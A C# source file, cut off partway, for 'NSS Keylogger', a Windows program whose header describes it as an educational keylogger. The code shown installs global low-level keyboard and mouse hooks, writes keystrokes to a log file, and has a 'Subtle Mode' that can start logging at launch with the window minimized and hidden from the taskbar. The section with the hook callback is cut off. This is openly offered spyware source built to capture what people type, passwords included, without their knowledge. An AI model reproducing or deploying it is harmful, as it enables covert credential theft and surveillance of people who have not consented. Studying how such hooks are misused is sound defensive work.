/* -========================- License and Distribution -========================-
 * 
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/* -==========================- About NSS Keylogger -==========================-
 *  
 *  NSS Keylogger stands for the "Not-So-Subtle" Keylogger. It is based off of
 *  Clicktastic v1.0.1. The goal of this project was to show how simple it can be
 *  to create a keylogger once a low level keyboard or mouse hook is provided.
 *  
 *  First, I should probably explain what a keylogger does in case you don't know.
 *  A keylogger logs every key press or potentially every mouse click that a user
 *  performs. This poses a massive security risk, as it renders passwords utterly
 *  useless, logging exactly what the user types.
 * 
 *  As hard as it may be to believe, this is an EDUCATIONAL project. I am a man of
 *  science, and I wish to learn as much as possible in my lifetime. Consequently,
 *  I do not intend to use this application to cause harm to others. Considering
 *  that it is based off of Clicktastic, which was released under GPL, it only
 *  makes sense to stick to the license and release this under GPL as well.
 *  I'm sure there are others out there that are curious how keyloggers work, and
 *  they are completely open to studying and using this code, so long as they obey
 *  the GPL license.
 *  
 *  HOWEVER, I DO NOT CONDONE BLACK-HAT USE OF THIS APPLICATION!!! IF YOU GET IN
 *  TROUBLE FOR USING THIS APPLICATION, OR SOMEONE STEALS INFORMATION FROM YOU
 *  WITH THIS APPLICATION, I CANNOT BE HELD RESPONSIBLE!!!
 *  
 *  It is for these reasons that I made this application "Not-So-Subtle." Network
 *  support is limited to what Windows explorer supports. Consequently, there is
 *  no packet "piggybacking" or anything of the like. Advanced keyloggers tend
 *  to make use of such features. With all of this in mind, the main focus of this
 *  project is aimed more towards the low level keyboard and mouse hooks and
 *  how dangerous they can be if they are misused.
 *  
 *  Finally, it is important to note that "Subtle Mode" only hides the window.
 *  The process can still be seen using the task manager.
 * 
 *  If you wish to contact me about the application, or anything of the like,
 *  feel free to send me an email at coolcord24@gmail.com
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace NSS_Keylogger
{
    public partial class NSSKeyloggerForm : Form
    {
        #region Initialization, Construction, and Startup
        //===========================================================================
        //
        // Initialization, Construction, and Startup
        //
        //===========================================================================

        //Define Structures
        [Serializable]
        [StructLayout(LayoutKind.Sequential)]
        public struct ProfileData
        {
            public KEYCOMBO ActivationKey;
            public KEYCOMBO DeactivationKey;
            public KEYCOMBO SubtleModeKey;
            public Boolean useDeactivationKey;
            public Boolean suppressHotkeys;
            public Boolean clearKeylogOnStartup;
            public Boolean subtleMode;
            public Boolean startupSubtleMode;
            public Boolean useSubtleModeKey;
            public String keylogSaveLocation;
        }
        [Serializable]
        [StructLayout(LayoutKind.Sequential)]
        public struct KEYCOMBO
        {
            public Boolean valid;
            public Boolean isKeyboard;
            public Keys modifierKeys;
            public Keys key;
            public string keyString;
            public string cmd;
            public uint mouseButton;
            public int wheel;
        }

        //Define Global Variables
        Boolean KeyloggerActivated = false;
        Boolean KeyloggerWaiting = true;
        Boolean Loading = false;
        Boolean Startup = true;
        Boolean SubtleModeActivated = false;
        Boolean StartupSubtleMode = false;
        Boolean CtrlDown = false;
        Boolean AltDown = false;
        Boolean ShiftDown = false;
        Boolean WinDown = false;
        int RetryAttempts = 0;
        KeyStringConverter keyStringConverter = new KeyStringConverter();
        Profile profile = new Profile();
        public ProfileData profileData = new ProfileData();
        static string currentDirectory = Directory.GetCurrentDirectory() + "\\Profiles";
        string previousProfile = "Default";

        //Constructor
        public NSSKeyloggerForm()
        {
            InitializeComponent();

            _procKey = HookCallbackKey;
            _procMouse = HookCallbackMouse;
            _hookIDKey = SetHookKey(_procKey);
            _hookIDMouse = SetHookMouse(_procMouse);

            if (!Directory.Exists(currentDirectory))
            {
                try
                {
                    Directory.CreateDirectory(currentDirectory);
                }
                catch { }
            }
            previousProfile = Properties.Settings.Default.DefaultProfile;

            RetryAttempts = 0;
            try
            {
                foreach (string file in Directory.GetFiles(currentDirectory, "*.nss"))
                {
                    ddbProfile.Items.Add(Path.GetFileNameWithoutExtension(file));
                }
                ddbProfile.SelectedItem = previousProfile;
            }
            catch { }
            Boolean loaded = false;
            Loading = true;
            while (!loaded)
            {
                loaded = AttemptLoad();
            }
            SetInstructions();
            
            //Clear keylog
            if (cbClearOnStartup.Checked)
            {
                if (File.Exists(tbKeylogSaveLocation.Text))
                {
                    try
                    {
                        File.Delete(tbKeylogSaveLocation.Text); //delete the old
                        File.Create(tbKeylogSaveLocation.Text).Dispose(); //create a new empty one
                    }
                    catch { MessageBox.Show("Unable to clear keylog!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error); }
                }
                else
                { //maybe keylog is already empty?
                    try
                    {
                        File.Create(tbKeylogSaveLocation.Text).Dispose();
                    } //create a new empty one
                    catch { MessageBox.Show("Unable to access keylog!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error); }
                }
            }
            
            //Start in subtle mode
            if (cbStartupSubtleMode.Checked)
            {
                ToggleKeylogger(profileData.ActivationKey.key);
                StartupSubtleMode = true;
                SubtleModeActivated = true;
                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
            }
            Startup = false;
        }
        #endregion

        #region Interface Event Handlers
        //===========================================================================
        //
        // Interface Event Handlers
        //
        //===========================================================================

        private void ActivationButton_Click(object sender, EventArgs e)
        {
            KEYCOMBO key = GetKeyDialog("Press any key");
            if (isActivationSettingsValid(key))
            { //make sure key is valid before accepting it
                profileData.ActivationKey = key;
                if (!cbUseDeactivationButton.Checked)
                    profileData.DeactivationKey = key;
                if (!cbUseSubtleModeButton.Checked)
                    profileData.SubtleModeKey = key;
                tbActivationButton.Text = key.keyString;
            }
        }

        private void DeactivationButton_Click(object sender, EventArgs e)
        {
            KEYCOMBO key = GetKeyDialog("Press any key");
            if (isActivationSettingsValid(key))
            { //make sure key is valid before accepting it
                profileData.DeactivationKey = key;
                tbDeactivationButton.Text = key.keyString;
            }
        }

        private void SubtleModeButton_Click(object sender, EventArgs e)
        {
            KEYCOMBO key = GetKeyDialog("Press any key");
            if (isActivationSettingsValid(key))
            { //make sure key is valid before accepting it
                profileData.SubtleModeKey = key;
                tbSubtleModeButton.Text = key.keyString;
            }
        }

        private void btnAbout_Click(object sender, EventArgs e)
        {
            Form aboutForm = new Form() { FormBorderStyle = FormBorderStyle.FixedSingle, MinimizeBox = false, MaximizeBox = false };
            aboutForm.StartPosition = FormStartPosition.CenterParent;
            aboutForm.Width = 400;
            aboutForm.Height = 200;
            aboutForm.Text = "About NSS Keylogger";
            aboutForm.Icon = Properties.Resources.nsskeylogger;
            aboutForm.BackColor = Color.Black;

            //Get the version number
            Assembly assembly = Assembly.GetExecutingAssembly();
            FileVersionInfo fileVersionInfo = FileVersionInfo.GetVersionInfo(assembly.Location);

            Label aboutText = new Label()
            {
                Width = 400,
                Height = 130,
                Location = new Point(0, 0),
                ImageAlign = ContentAlignment.MiddleCenter,
                TextAlign = ContentAlignment.MiddleCenter,
                Text = "NSS Keylogger v" + fileVersionInfo.ProductMajorPart + "." + fileVersionInfo.ProductMinorPart + "." + fileVersionInfo.ProductBuildPart + "\n" +
                    "Based on Clicktastic v1.0.1\n\n" +
                    "Log Key Presses and Mouse Clicks\n\n" +
                    "Programmed and Designed by Coolcord"
            };
            Font aboutFont = new Font("Microsoft Sans Serif", 8, FontStyle.Bold);
            aboutText.Font = aboutFont;
            aboutText.ForeColor = Color.White;
            Button btnOk = new Button() { Width = 100, Height = 30, Text = "OK", Location = new Point(150, 130), ImageAlign = ContentAlignment.MiddleCenter, TextAlign = ContentAlignment.MiddleCenter };
            btnOk.Click += (btnSender, btnE) => aboutForm.Close(); //click ok to close
            btnOk.BackColor = SystemColors.ButtonFace;
            btnOk.UseVisualStyleBackColor = true;
            aboutForm.AcceptButton = btnOk;
            aboutForm.Controls.Add(aboutText);
            aboutForm.Controls.Add(btnOk);

            //Easter Egg =D
            aboutForm.KeyPreview = true;
            CheatCode cheatCode = new CheatCode();
            aboutForm.KeyDown += new KeyEventHandler(cheatCode.GetCheatCode);

            //All done with the about form
            aboutForm.ShowDialog();
            aboutForm.Dispose();
            btnOk.Dispose();
            aboutText.Dispose();
            aboutFont.Dispose();
        }

        private void btnClearKeylog_Click(object sender, EventArgs e)
        {
            Boolean keylogCleared = false;
            DialogResult result = MessageBox.Show("This will delete and recreate the keylog at:\n" + tbKeylogSaveLocation.Text + "\nAre you sure you want to clear the keylog?", "NSS Keylogger", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (result == DialogResult.Yes)
            {
                try
                {
                    if (File.Exists(tbKeylogSaveLocation.Text))
                        File.Delete(tbKeylogSaveLocation.Text); //delete the old
                    File.Create(tbKeylogSaveLocation.Text).Dispose(); //create a new empty one
                    keylogCleared = true;
                }
                catch { MessageBox.Show("Unable to clear keylog!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error); }
            }
            if (keylogCleared) MessageBox.Show("Keylog Cleared!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Information); //show the success window
        }

        private void btnKeylogSaveLocation_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.DefaultExt = ".txt";
                save.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                save.FileName = "Keylog";
                if (save.ShowDialog() != DialogResult.OK) return;
                tbKeylogSaveLocation.Text = save.FileName;
            }
        }

        private void btnManageProfiles_Click(object sender, EventArgs e)
        {
            ProfileManager profileManager = new ProfileManager(ref profileData);
            profileManager.StartPosition = FormStartPosition.CenterParent;
            profileManager.ShowDialog();

            ddbProfile.Items.Clear();
            foreach (string file in Directory.GetFiles(currentDirectory, "*.nss"))
            {
                ddbProfile.Items.Add(Path.GetFileNameWithoutExtension(file));
            }

            if (previousProfile != null && ddbProfile.Items.Contains(previousProfile))
                ddbProfile.SelectedItem = previousProfile; //select the proper profile again
            else if (ddbProfile.Items.Count > 0)
                ddbProfile.SelectedIndex = 0; //profile was deleted, so use the top one
            else //the user deleted every profile
            {
                CreateDefaultProfile();
            }

            profileManager.Dispose();
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            if (profile.Save(ddbProfile.Text, ref profileData))
                MessageBox.Show(ddbProfile.Text + " saved successfully!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else //save failed
                MessageBox.Show("Unable to save " + ddbProfile.Text + "!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Properties.Settings.Default.DefaultProfile = ddbProfile.Text;
            Properties.Settings.Default.Save(); //load this profile the next time the application starts
        }

        private void btnViewKeylog_Click(object sender, EventArgs e)
        {
            if (!File.Exists(tbKeylogSaveLocation.Text))
            {
                try
                {
                    File.Create(tbKeylogSaveLocation.Text).Dispose();
                } //create a new empty one
                catch { }
            }
            try
            {
                System.Diagnostics.Process.Start(tbKeylogSaveLocation.Text);
            }
            catch { MessageBox.Show("Unable to access keylog!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error); }
        }

        private void cbClearOnStartup_CheckedChanged(object sender, EventArgs e)
        {
            profileData.clearKeylogOnStartup = cbClearOnStartup.Checked;
        }

        private void cbStartupSubtleMode_CheckedChanged(object sender, EventArgs e)
        {
            profileData.startupSubtleMode = cbStartupSubtleMode.Checked;
        }

        private void cbSubtleMode_CheckedChanged(object sender, EventArgs e)
        {
            if (cbSubtleMode.Checked)
            {
                cbStartupSubtleMode.Enabled = true;
                cbStartupSubtleMode.Visible = true;
                cbUseSubtleModeButton.Enabled = true;
                cbUseSubtleModeButton.Visible = true;
                profileData.subtleMode = true;
            }
            else //subtle mode disabled
            {
                cbStartupSubtleMode.Checked = false;
                cbStartupSubtleMode.Enabled = false;
                cbStartupSubtleMode.Visible = false;
                profileData.startupSubtleMode = false;
                cbUseSubtleModeButton.Checked = false;
                cbUseSubtleModeButton.Enabled = false;
                cbUseSubtleModeButton.Visible = false;
                profileData.useSubtleModeKey = false;
                lblSubtleModeButton.Enabled = false;
                lblSubtleModeButton.Visible = false;
                profileData.SubtleModeKey = profileData.ActivationKey;
                tbSubtleModeButton.Text = tbActivationButton.Text;
                tbSubtleModeButton.Enabled = false;
                btnSubtleModeButton.Enabled = false;
                tbSubtleModeButton.Visible = false;
                btnSubtleModeButton.Visible = false;
                profileData.subtleMode = false;
            }
            SetInstructions();
        }

        private void cbSuppressHotkeys_CheckedChanged(object sender, EventArgs e)
        {
            profileData.suppressHotkeys = cbSuppressHotkeys.Checked;
        }

        private void cbUseDeactivationButton_CheckedChanged(object sender, EventArgs e)
        {
            if (cbUseDeactivationButton.Checked)
            {
                lblDeactivationButton.Enabled = true;
                tbDeactivationButton.Enabled = true;
                btnDeactivationButton.Enabled = true;
                lblDeactivationButton.Visible = true;
                tbDeactivationButton.Visible = true;
                btnDeactivationButton.Visible = true;
                profileData.useDeactivationKey = true;
            }
            else //no deactivation hotkey
            {
                lblDeactivationButton.Enabled = false;
                lblDeactivationButton.Visible = false;
                profileData.DeactivationKey = profileData.ActivationKey;
                tbDeactivationButton.Text = tbActivationButton.Text;
                tbDeactivationButton.Enabled = false;
                btnDeactivationButton.Enabled = false;
                tbDeactivationButton.Visible = false;
                btnDeactivationButton.Visible = false;
                profileData.useDeactivationKey = false;
            }
            SetInstructions();
        }

        private void cbUseSubtleModeButton_CheckedChanged(object sender, EventArgs e)
        {
            if (cbUseSubtleModeButton.Checked)
            {
                lblSubtleModeButton.Enabled = true;
                tbSubtleModeButton.Enabled = true;
                btnSubtleModeButton.Enabled = true;
                lblSubtleModeButton.Visible = true;
                tbSubtleModeButton.Visible = true;
                btnSubtleModeButton.Visible = true;
                profileData.useSubtleModeKey = true;
            }
            else //no subtle mode hotkey
            {
                lblSubtleModeButton.Enabled = false;
                lblSubtleModeButton.Visible = false;
                profileData.SubtleModeKey = profileData.ActivationKey;
                tbSubtleModeButton.Text = tbActivationButton.Text;
                tbSubtleModeButton.Enabled = false;
                btnSubtleModeButton.Enabled = false;
                tbSubtleModeButton.Visible = false;
                btnSubtleModeButton.Visible = false;
                profileData.useSubtleModeKey = false;
            }
            SetInstructions();
        }

        private void ddbProfile_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (Loading)
            {
                Boolean loaded = false;
                while (!loaded)
                { //keep trying to load a file until one succeeds
                    loaded = AttemptLoad();
                }
            }
            else
                Loading = false;
        }

        private void NSSKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            Shutdown();
        }

        public void NSSKeylogger_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers.Equals(Keys.Alt))
            {
                e.Handled = true; //don't open the menu with alt
            }
        }

        private void tbActivationButton_TextChanged(object sender, EventArgs e)
        {
            if (!cbUseDeactivationButton.Checked)
            {
                tbDeactivationButton.Text = tbActivationButton.Text;
            }
            if (!cbUseSubtleModeButton.Checked)
            {
                tbSubtleModeButton.Text = tbActivationButton.Text;
            }
            SetInstructions();
        }

        private void tbDeactivationButton_TextChanged(object sender, EventArgs e)
        {
            SetInstructions();
        }

        private void tbKeylogSaveLocation_TextChanged(object sender, EventArgs e)
        {
            profileData.keylogSaveLocation = tbKeylogSaveLocation.Text;
        }

        private void tbSubtleModeButton_TextChanged(object sender, EventArgs e)
        {
            if (!cbUseSubtleModeButton.Checked)
            {
                tbSubtleModeButton.Text = tbActivationButton.Text;
            }
            SetInstructions();
        }

        private void tcNSSKeylogger_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (tcNSSKeylogger.SelectedIndex != 0)
            {
                //Stop the Keylogger
                KeyloggerActivated = false;
                KeyloggerWaiting = true;
                this.Invoke(new MethodInvoker(() =>
                { //mark status as disabled
                    pbKeyloggerRunning.Image = Properties.Resources.RedCircle;
                    lblKeyloggerRunning.Text = "Disabled";
                    lblKeyloggerRunning.ForeColor = Color.Red;
                }));
            }
        }
        #endregion

        #region Functions
        //===========================================================================
        //
        // Functions
        //
        //===========================================================================

        //
        // AttemptLoad()
        // Attempts to load a profile and will try various things to achieve success
        //
        private Boolean AttemptLoad()
        {
            ProfileData loadProfileData = new ProfileData();
            if (profile.Load(ddbProfile.Text, ref loadProfileData))
            { //load from file successful
                ProfileData previousProfileData = profileData;
                profileData = loadProfileData;
                if (!UpdatePreferences())
                {
                    profileData = previousProfileData;
                    return false; //preferences could not be updated, so the loading failed
                }
                previousProfile = ddbProfile.Text;
                RetryAttempts = 0;
                Properties.Settings.Default.DefaultProfile = ddbProfile.Text;
                Properties.Settings.Default.Save();
                SetInstructions();
                return true;
            }
            else //load from file failed
            {
                if (!Directory.Exists(currentDirectory)) //make sure the profile folder exists
                {
                    try
                    {
                        Directory.CreateDirectory(currentDirectory); //if not, create it
                    } catch { }
                }
                if (!Startup && RetryAttempts == 0) //only show the error message one time
                    MessageBox.Show("Unable to load profile!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error);
                if (RetryAttempts == 0 && ddbProfile.Items.Contains(previousProfile))
                {
                    RetryAttempts++;
                    ddbProfile.SelectedItem = previousProfile; //revert back to previous profile
                }
                else if (RetryAttempts < 2 && ddbProfile.Items.Count > 0)
                {
                    RetryAttempts++;
                    ddbProfile.SelectedIndex = 0; //attempt to revert to the first profile in the list
                }
                else if (RetryAttempts < 3 && ddbProfile.Items.Contains("Default"))
                {
                    RetryAttempts++;
                    ddbProfile.SelectedItem = "Default"; //attempt to fall back to the default profile
                }
                else //give up
                {
                    RetryAttempts = 0;
                    CreateDefaultProfile(); //recreate default profile
                    return true;
                }
                return false;
            }
        }

        //
        // CreateDefaultProfile()
        // Creates the default profile and saves it to a file
        //
        private void CreateDefaultProfile()
        {
            try
            {
                if (!Directory.Exists(currentDirectory)) //make sure the profile folder exists
                {
                    Directory.CreateDirectory(currentDirectory);
                }
                if (File.Exists(currentDirectory + "\\Default.nss")) //the file exists already
                {
                    File.SetAttributes(currentDirectory + "\\Default.nss", FileAttributes.Normal);
                    File.Delete(currentDirectory + "\\Default.nss"); //delete it
                }
            }
            catch { }

            //Default settings
            profileData.ActivationKey = ParseKEYCOMBO("` (~)", Keys.Oemtilde);
            profileData.DeactivationKey = ParseKEYCOMBO("` (~)", Keys.Oemtilde);
            profileData.SubtleModeKey = ParseKEYCOMBO("` (~)", Keys.Oemtilde);
            profileData.keylogSaveLocation = Application.StartupPath + "\\Keylog.txt";
            profileData.useDeactivationKey = false;
            profileData.useSubtleModeKey = false;
            profileData.suppressHotkeys = false;
            profileData.subtleMode = false;
            profileData.startupSubtleMode = false;

            profile.Save("Default", ref profileData); //save the file
            try
            {
                ddbProfile.Items.Clear();
                foreach (string file in Directory.GetFiles(currentDirectory, "*.nss"))
                { //update the profiles list
                    ddbProfile.Items.Add(Path.GetFileNameWithoutExtension(file));
                }
                ddbProfile.SelectedItem = "Default";
            }
            catch { }
        }

        //
        // GetKeyDialog(string message)
        // Asks the user to press a key and returns the key that the user pressed
        //
        private KEYCOMBO GetKeyDialog(string message)
        {
            //Construct the key dialog
            Form keyPrompt = new Form() { FormBorderStyle = FormBorderStyle.FixedSingle, MinimizeBox = false, MaximizeBox = false };
            keyPrompt.StartPosition = FormStartPosition.CenterParent;
            keyPrompt.Width = 250;
            keyPrompt.Height = 100;
            keyPrompt.Text = "NSS Keylogger";
            keyPrompt.KeyPreview = true;
            keyPrompt.Icon = Properties.Resources.nsskeylogger;
            keyPrompt.BackColor = Color.Black;
            Label lblKey = new Label() { Width = 250, Height = 65, ImageAlign = ContentAlignment.MiddleCenter, TextAlign = ContentAlignment.MiddleCenter, Text = message, ForeColor = Color.White };
            lblKey.Font = new Font("Microsoft Sans Serif", 8, FontStyle.Bold);
            keyPrompt.Controls.Add(lblKey);
            System.Timers.Timer timer = new System.Timers.Timer(750);
            int textState = 1;
            timer.AutoReset = true;
            timer.Enabled = true;
            timer.Elapsed += (sender, e) =>
            {
                try
                {
                    this.Invoke(new MethodInvoker(() =>
                    {
                        switch (textState)
                        { //add dots to the end of the message as time passes
                            case 0:
                                lblKey.Text = message;
                                break;
                            case 1:
                                lblKey.Text = message + ".";
                                break;
                            case 2:
                                lblKey.Text = message + "..";
                                break;
                            case 3:
                                lblKey.Text = message + "...";
                                break;
                        }
                    }));
                    textState = (textState + 1) % 4;
                }
                catch { }
            };
            KEYCOMBO key = new KEYCOMBO();
            Keys lastKey = Keys.None;
            key.valid = false; //assume invalid unless otherwise stated
            string strKey = null;
            keyPrompt.PreviewKeyDown += (sender, e) =>
            {
                timer.Stop();

                //Determine the key pressed
                strKey = keyStringConverter.KeyToString(e.KeyCode);

                //Determine key modifiers
                if (e.Alt && e.KeyCode != Keys.Menu)
                    strKey = "Alt + " + strKey;
                if (e.Shift && e.KeyCode != Keys.ShiftKey)
                    strKey = "Shift + " + strKey;
                if (e.Control && e.KeyCode != Keys.ControlKey)
                    strKey = "Ctrl + " + strKey;

                lblKey.Text = strKey;
                lastKey = e.KeyCode;
            };
            keyPrompt.KeyDown += (sender, e) =>
            {
                if (e.Modifiers.Equals(Keys.Alt))
                {
                    e.Handled = true; //don't open the menu with alt
                }
            };
            keyPrompt.KeyUp += (sender, e) =>
            {
                keyPrompt.Close();
            };
            lblKey.MouseClick += (sender, e) =>
            {
                timer.Stop();
                if (e.Button == MouseButtons.Left)
                    strKey = "LeftClick";
                else if (e.Button == MouseButtons.Right)
                    strKey = "RightClick";
                else if (e.Button == MouseButtons.Middle)
                    strKey = "MiddleClick";
                else
                    return; //button not recognized
                string strLastKey = lblKey.Text.Split(' ').Last();
                if (strLastKey == "Ctrl" || strLastKey == "Shift" || strLastKey == "Alt")
                    strKey = lblKey.Text + " + " + strKey;
                lblKey.Text = strKey;
                lastKey = Keys.None;
                keyPrompt.Close();
            };
            keyPrompt.MouseWheel += (sender, e) =>
            {
                timer.Stop();
                if (e.Delta < 0) //negative is down
                    strKey = "MouseWheelDown";
                else //positive is up
                    strKey = "MouseWheelUp";
                string strLastKey = lblKey.Text.Split(' ').Last();
                if (strLastKey == "Ctrl" || strLastKey == "Shift" || strLastKey == "Alt")
                    strKey = lblKey.Text + " + " + strKey;
                lblKey.Text = strKey;
                lastKey = Keys.None;
                keyPrompt.Close();
            };
            keyPrompt.ShowDialog();

            //All done with the dialog
            keyPrompt.Dispose();
            lblKey.Dispose();
            key = ParseKEYCOMBO(strKey, lastKey);
            return key;
        }

        //
        // isActivationSettingsValid(KEYCOMBO key)
        // Checks if the activation hotkey settings are valid. It throws errors and returns false if not
        //
        private Boolean isActivationSettingsValid(KEYCOMBO key)
        {
            if (!key.valid)
            {
                return false;
            }
            else if (key.isKeyboard && key.key == Keys.None && key.modifierKeys == Keys.None)
            {
                MessageBox.Show("That key is not supported!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            else if (!key.isKeyboard && (key.mouseButton != MOUSEEVENTF_LEFTDOWN &&
                key.mouseButton != MOUSEEVENTF_RIGHTDOWN &&
                key.mouseButton != MOUSEEVENTF_MIDDLEDOWN &&
                key.wheel == 0))
            { //unknown combination of settings
                MessageBox.Show("That button is not supported!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            else if (!key.isKeyboard)
            {
                MessageBox.Show("Mouse buttons cannot be used as activator hotkeys!", "NSS Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            else
                return true;
        }

        //
        // isKeyAcceptable(Keys key)
        // Checks the list of unnacceptable hotkeys and returns false if the key is unnacceptable
        //
        private Boolean isKeyAcceptable(Keys key)
        {
            switch (key)
            {
                case Keys.Control:
                case Keys.ControlKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                case Keys.Shift:
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.Alt:
                case Keys.Menu:
                case Keys.LMenu:
                case Keys.RMenu:
                case Keys.LWin:
                case Keys.RWin:
                case Keys.None:
                    return false; //these are not accepted
                default:
                    return true; //anything else is accepted
            }
        }

        //
        // ParseKEYCOMBO(string strKey, Keys lastKeyCode)
        // Creates a KEYCOMBO structure out of a string and a keycode
        //
        private KEYCOMBO ParseKEYCOMBO(string strKey, Keys lastKeyCode)
        {
            KEYCOMBO key = new KEYCOMBO();
            if (strKey == null)
            {
                key.valid = false;
                return key; //key is invalid, so give up
            }
            key.keyString = strKey;
            Boolean ctrl = false;
            Boolean shift = false;
            Boolean alt = false;
            key.modifierKeys = Keys.None;
            key.isKeyboard = false;
            key.mouseButton = 0;
            key.wheel = 0;
            key.key = Keys.None;
            string[] buttons = strKey.Split(' ');
            string previous = null;
            string lastKey = buttons.Last();
            foreach (string button in buttons)
            {
                if (button == "(~)" || (button == "+" && (button == previous || lastKey != button)))
                {
                    previous = button;
                    continue;
                }
                if (button != lastKey)
                {
                    if (button == "Ctrl")
                    {
                        ctrl = true;
                        previous = button;
                        continue;
                    }
                    else if (button == "Shift")
                    {
                        shift = true;
                        previous = button;
                        continue;
                    }
                    else if (button == "Alt")
                    {
                        alt = true;
                        previous = button;
                        continue;
                    }
                }
                if (button == "LeftClick") key.mouseButton = MOUSEEVENTF_LEFTDOWN;
                else if (button == "RightClick") key.mouseButton = MOUSEEVENTF_RIGHTDOWN;
                else if (button == "MiddleClick") key.mouseButton = MOUSEEVENTF_MIDDLEDOWN;
                else if (button == "MouseWheelDown") key.wheel = -120;
                else if (button == "MouseWheelUp") key.wheel = 120;
                else
                {
                    key.isKeyboard = true;

                    if (button == "Ctrl") ctrl = true;
                    else if (button == "Shift") shift = true;
                    else if (button == "Alt") alt = true;

                    if (!isKeyAcceptable(lastKeyCode))
                    {
                        key.key = Keys.None; //allow only Ctrl, Shift, or Alt by themselves
                    }
                    else
                        key.key = lastKeyCode; //store the key code
                }
                previous = button;
            }

            //Add modifier keys
            if (ctrl)
                key.modifierKeys = key.modifierKeys | Keys.Control;
            if (shift)
                key.modifierKeys = key.modifierKeys | Keys.Shift;
            if (alt)
                key.modifierKeys = key.modifierKeys | Keys.Alt;
            key.cmd = keyStringConverter.KeyToCmd(key.key, key.modifierKeys, false, 0);
            if (key.isKeyboard && key.cmd == null)
                key.valid = false; //key command could not be constructed, so key is invalid
            else
                key.valid = true;
            return key;
        }

        //
        // SetInstructions()
        // Updates the instructions on the front tab of the application
        //
        private void SetInstructions()
        {
            string instructions = "";
            instructions = instructions + "Press " + tbActivationButton.Text + " to enable Keylogger";
            if (tbActivationButton.Text != tbDeactivationButton.Text)
                instructions = instructions + "\nPress " + tbDeactivationButton.Text + " to disable Keylogger";
            if (cbSubtleMode.Checked && tbActivationButton.Text != tbSubtleModeButton.Text)
                instructions = instructions + "\nPress " + tbSubtleModeButton.Text + " to toggle Subtle Mode";
            instructions = instructions + "\n\n";
            lblInstructions.Text = instructions;
        }

        //
        // Shutdown()
        // Called when the application closes. This prevents the keylogger from running after close
        //
        private void Shutdown()
        {
            KeyloggerActivated = false;

            //Release all low level hooks
            UnhookWindowsHookEx(_hookIDKey);
            UnhookWindowsHookEx(_hookIDMouse);
        }

        //
        // ToggleKeylogger(Keys key)
        // Turns the keylogger on and off
        //
        private void ToggleKeylogger(Keys key)
        {
            if (KeyloggerActivated && key == profileData.DeactivationKey.key)
            {
                KeyloggerActivated = false;
                if (!KeyloggerWaiting)
                {
                    try
                    {
                        this.Invoke(new MethodInvoker(() =>
                        { //mark status as waiting
                            pbKeyloggerRunning.Image = Properties.Resources.RedCircle;
                            lblKeyloggerRunning.Text = "Disabled";
                            lblKeyloggerRunning.ForeColor = Color.Red;
                        }));
                    } catch { }
                    KeyloggerWaiting = true;
                }
            }
            else if (!KeyloggerActivated && key == profileData.ActivationKey.key)
            {
                KeyloggerActivated = true;
                if (KeyloggerWaiting)
                {
                    try
                    {
                        this.Invoke(new MethodInvoker(() =>
                        { //mark status as running
                            pbKeyloggerRunning.Image = Properties.Resources.GreenCircle;
                            lblKeyloggerRunning.Text = "Enabled";
                            lblKeyloggerRunning.ForeColor = Color.Lime;
                        }));
                    } catch { }
                    KeyloggerWaiting = false;
                }
            }
        }

        //
        // UpdatePreferences()
        // Updates the settings after loading a new profile
        //
        private Boolean UpdatePreferences()
        {
            try
            {
                //Checkboxes
                cbUseDeactivationButton.Checked = profileData.useDeactivationKey;
                cbSuppressHotkeys.Checked = profileData.suppressHotkeys;
                cbClearOnStartup.Checked = profileData.clearKeylogOnStartup;
                cbSubtleMode.Checked = profileData.subtleMode;
                cbStartupSubtleMode.Checked = profileData.startupSubtleMode;
                cbUseSubtleModeButton.Checked = profileData.useSubtleModeKey;

                //Textboxes
                tbActivationButton.Text = profileData.ActivationKey.keyString;
                tbDeactivationButton.Text = profileData.DeactivationKey.keyString;
                tbSubtleModeButton.Text = profileData.SubtleModeKey.keyString;
                tbKeylogSaveLocation.Text = profileData.keylogSaveLocation;
            }
            catch
            { //preferences could not be updated -- assume that the loaded file is corrupted
                return false;
            }
            return true;
        }
        #endregion

        #region Low Level Keyboard Hook
        //===========================================================================
        //
        // Low Level Keyboard Hook
        //
        //===========================================================================

        //Define constants
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;

        //Define Global Variables
